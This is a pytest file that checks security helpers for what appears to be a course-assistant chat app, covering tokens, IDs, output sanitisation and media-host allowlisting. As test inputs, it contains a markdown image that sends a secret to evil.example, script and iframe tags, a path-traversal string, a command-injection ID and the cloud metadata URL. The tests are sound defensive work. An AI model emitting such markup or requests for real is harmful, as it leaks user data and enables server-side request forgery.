import pytest

from security_utils import (
    bounded_int,
    hash_session_token,
    mediasite_host_allowed,
    new_session_token,
    redact_path,
    same_origin,
    sanitize_model_output,
    session_token_matches,
    valid_session_id,
)


def test_session_tokens_are_random_hashed_and_compared_safely():
    token = new_session_token()
    assert len(token) >= 40 and token != new_session_token()
    stored = hash_session_token(token)
    assert stored != token
    assert session_token_matches(stored, token)
    assert not session_token_matches(stored, token + "x")
    assert not session_token_matches(stored, None)
    assert not session_token_matches(None, token)


def test_session_ids_are_restricted_to_safe_characters():
    assert valid_session_id("3f2b6c1e-2c7d-4a54-9a1b-0f6f3c3b8e21")
    for bad in ("", "../etc/passwd", "a b", "x" * 129, "id;drop"):
        assert not valid_session_id(bad)


def test_bounded_int_clamps_and_rejects_non_numbers():
    assert bounded_int(None, 4, 1, 20, "top_k") == 4
    assert bounded_int("7", 4, 1, 20, "top_k") == 7
    assert bounded_int(999, 4, 1, 20, "top_k") == 20
    assert bounded_int(-3, 4, 1, 20, "top_k") == 1
    for bad in ("many", [1], True):
        with pytest.raises(ValueError, match="top_k"):
            bounded_int(bad, 4, 1, 20, "top_k")


def test_sanitize_model_output_blocks_exfiltration_channels():
    trusted = ["The syllabus is at https://course.example.edu/syllabus."]
    text = (
        "Answer [1]. ![x](https://evil.example/?q=secret) "
        "[syllabus](https://course.example.edu/syllabus) [click](https://evil.example/a) "
        "<script>alert(1)</script><iframe src='https://evil.example'></iframe> "
        "<https://evil.example/auto> www.evil.example/b https://course.example.edu/syllabus.\n"
        "[ref]: https://evil.example/ref"
    )
    cleaned = sanitize_model_output(text, trusted)
    assert "evil.example" not in cleaned
    assert "<script" not in cleaned and "<iframe" not in cleaned
    assert "[syllabus](https://course.example.edu/syllabus)" in cleaned
    assert "click" in cleaned and "Answer [1]." in cleaned
    assert cleaned.rstrip().endswith("[link removed] https://course.example.edu/syllabus.")


def test_sanitize_leaves_citations_and_plain_text_alone():
    text = "Mitosis has four phases [1][2]. See (2:05) for the diagram."
    assert sanitize_model_output(text, []) == text


def test_mediasite_hosts_must_be_https_and_allowlisted():
    configured = "https://media.example.edu/Mediasite/api/v1"
    assert mediasite_host_allowed("https://media.example.edu/Other", configured, [])
    assert mediasite_host_allowed("https://other.example.edu/Mediasite", None, ["other.example.edu"])
    assert not mediasite_host_allowed("http://media.example.edu/Mediasite", configured, [])
    assert not mediasite_host_allowed("https://attacker.example", configured, [])
    assert not mediasite_host_allowed("https://169.254.169.254/latest/meta-data", configured, [])
    assert same_origin("https://media.example.edu/a", "https://media.example.edu:443/b")
    assert not same_origin("https://media.example.edu.attacker.example/a", configured)


def test_redact_path_hides_session_ids():
    assert redact_path("/session/abc-123") == "/session/{id}"
    assert redact_path("/chat/") == "/chat/"
